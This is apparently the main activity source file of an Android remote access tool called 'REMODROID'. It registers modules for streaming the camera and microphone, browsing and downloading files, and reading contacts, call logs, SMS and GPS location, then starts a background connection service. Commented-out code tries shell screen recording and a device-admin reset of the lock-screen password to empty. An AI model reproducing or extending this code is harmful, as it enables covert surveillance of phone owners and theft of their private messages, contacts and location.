package com.remo;

import android.app.Activity;
import android.app.KeyguardManager;
import android.app.admin.DevicePolicyManager;
//import android.content.Context;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.StrictMode;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Window;
import android.view.WindowManager;
import com.remo.Connections.DataHandler;
import com.remo.Connections.Feature;
import com.remo.Connections.MainConnectionService;
import com.remo.Features.*;
import dalvik.system.DexFile;

import java.lang.reflect.*;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Enumeration;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.d("REMODROID", "Main Activity Started");
        Thread.setDefaultUncaughtExceptionHandler(
                new Thread.UncaughtExceptionHandler() {
                    @Override
                    public void uncaughtException(Thread thread, Throwable ex) {
                        Log.e("REMODROID", "Main Thread UncaughtException: " + ex.getMessage());
                    }
                });


        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CAM.ordinal(),CamStream.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.MIC.ordinal(),MicStream.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_LIST.ordinal(),FileMan.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.FM_DOWN.ordinal(),FileDownloader.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.INFO.ordinal(),MobileInfo.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CONTACTS.ordinal(),Contacts.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_LOG.ordinal(),Call_Log.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.SMS.ordinal(),SMS.class);
        //DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.CALL_RECORDS.ordinal(),CALL_RECORDS.class);
        DataHandler.FeaturesClassesDict.put(DataHandler.eDataType.GPS.ordinal(),GPS.class);





        startService(new Intent(getApplicationContext(), com.remo.Connections.MainConnectionService.class));



//        String[] s = getClassesOfPackage(Feature.class.getPackage().getName());
//        for(String c: s){
//            Log.d("REMODROID",c);
//        }

//        Field[] aClassFields = .getDeclaredFields();
//        for(Field f : aClassFields){
//            // Found a field f
//        }




      //  getApplicationContext().deleteFile(filename);
        //Log.d("REMODROID", (getApplicationContext() == App.get().getApplicationContext())+"");

        //For networking on main Thread
        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
        StrictMode.setThreadPolicy(policy);

//        Thread SCreen = new Thread(new Runnable() {
//            @Override
//            public void run() {
//                String commandToRun = "adb shell screenrecord --time-limit 10 /sdcard/demo.mp4";
//                try {
//                    Runtime.getRuntime().exec(commandToRun);
//                    runShellCommand(commandToRun);
//                } catch (Exception ex) {
//                    Log.e("REMODROID", "ADB Error "+ex.getMessage());
//                }
//            }
//        });
//        SCreen.start();
//        try {
//            Thread.sleep(10000);
//        } catch (InterruptedException e) {
//            e.printStackTrace();
//        }
//        process.destroy();


//        mDeviceAdminSample = new ComponentName(this,DeviceAdminSampleReceiver.class);
//        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
//        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDeviceAdminSample);
//        this.startActivityForResult(intent, 0);
//
//
//        DevicePolicyManager deviceManager = (DevicePolicyManager)getSystemService(Context.DEVICE_POLICY_SERVICE);
//        ComponentName compName = new ComponentName(this, MainConnectionService.class);
//        deviceManager.setPasswordMinimumLength(compName, 0);
//        boolean result = deviceManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);

//        try {
//            Document doc = Jsoup.connect("http://www.wikia.com/fandom").get();
//            String title = doc.title();
//            Log.d("REMODROID", title);
//        }catch (Exception ex){
//            Log.e("REMODROID", "Jsoup Error "+ex.getMessage());
//        }


    }





//    private String[] getClassesOfPackage(String packageName) {
//        ArrayList<String> classes = new ArrayList<String>();
//        try {
//            String packageCodePath = getPackageCodePath();
//            DexFile df = new DexFile(packageCodePath);
//            for (Enumeration<String> iter = df.entries(); iter.hasMoreElements(); ) {
//                String className = iter.nextElement();
//                if (className.contains(packageName)) {
//                    classes.add(className.substring(className.lastIndexOf(".") + 1, className.length()));
//                }
//            }
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//
//        return classes.toArray(new String[classes.size()]);
//    }


}
